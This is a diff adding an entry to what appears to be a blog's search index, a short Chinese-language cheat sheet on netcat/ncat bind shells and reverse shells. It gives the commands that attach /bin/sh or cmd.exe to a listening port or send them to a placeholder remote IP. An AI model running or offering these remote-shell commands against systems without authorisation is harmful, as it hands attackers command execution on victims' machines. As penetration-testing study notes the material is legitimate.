@@ -4,6 +4,19 @@
   
     
     <entry>
+      <title>shell</title>
+      <link href="/posts/4592b2fd.html"/>
+      <url>/posts/4592b2fd.html</url>
+      
+        <content type="html"><![CDATA[<h1 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h1><h2 id="本地监听端口"><a href="#本地监听端口" class="headerlink" title="本地监听端口"></a>本地监听端口</h2><p><font color=red size=3>绑定SH到本地1234端口</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ncat -e /bin/sh -lvp 1234</span><br><span class="line">nc -e cmd.exe -lvp 1234</span><br></pre></td></tr></table></figure><p><font color=red size=3>主动连接目标1234</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ncat x.x.x.x(对方服务器IP) 1234</span><br><span class="line">nc x.x.x.x(对方服务器IP) 1234</span><br></pre></td></tr></table></figure><h1 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h1><h2 id="远程监听端口"><a href="#远程监听端口" class="headerlink" title="远程监听端口"></a>远程监听端口</h2><p><font color=red size=3>绑定SH到对方服务器1234端口</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ncat -e /bin/sh x.x.x.x(对方服务器IP) 1234 </span><br><span class="line">nc -e cmd x.x.x.x(对方服务器IP) 1234</span><br></pre></td></tr></table></figure><p><font color=red size=3>监听本地端口1234</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ncat -lvvp 1234</span><br><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>墨者</title>
       <link href="/posts/74d3b872.html"/>
       <url>/posts/74d3b872.html</url>
